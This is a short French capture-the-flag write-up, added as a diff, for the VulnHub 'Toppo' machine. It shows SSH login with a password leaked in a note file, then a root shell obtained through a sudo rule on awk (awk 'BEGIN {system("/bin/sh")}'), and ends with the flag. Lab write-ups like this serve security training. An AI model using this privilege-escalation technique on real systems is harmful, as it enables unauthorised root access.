@@ -1,0 +1,63 @@
+Dan sle fichier note à http://<ip>/admin
+on a un fichier note.txt qui dit :
+Note to myself :
+
+I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
+
+donc on teste avec ce user ted et avec ce mot de passe.
+
+root@DebSec:~/Documents/Challenge/VulnHub/toppo# ssh ted@192.168.1.25
+The authenticity of host '192.168.1.25 (192.168.1.25)' can't be established.
+ECDSA key fingerprint is SHA256:+i9tqbQwK978CB+XRr02pS6QPd3evJ+lueOkK1LTtU0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.25' (ECDSA) to the list of known hosts.
+ted@192.168.1.25's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
+ted@Toppo:~$ 
+
+Après plein de tentatives en vracs :
+
+ted@Toppo:/$ cat /etc/sudoers 
+ted ALL=(ALL) NOPASSWD: /usr/bin/awk
+
+ted@Toppo:/$ awk 'BEGIN {system("whoami")}'
+root
+ted@Toppo:/$ awk 'BEGIN {system("/bin/bash")}'
+bash-4.3$ id
+uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
+bash-4.3$ awk 'BEGIN {system("/bin/sh")}'
+# id
+uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
+# whoami
+root
+# 
+# 
+# 
+# ls
+bin  boot  dev	etc  home  initrd.img  lib  lost+found	media  mnt  opt  proc  root  run  sbin	srv  sys  tmp  usr  var  vmlinuz
+# ls /root
+flag.txt
+# cat /root/flag.txt	
+_________                                  
+|  _   _  |                                 
+|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
+    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
+   _| |_ | \__. | | \__/ | | \__/ || \__. | 
+  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
+                 [__|     [__|              
+
+
+
+
+Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
+
+
+
+
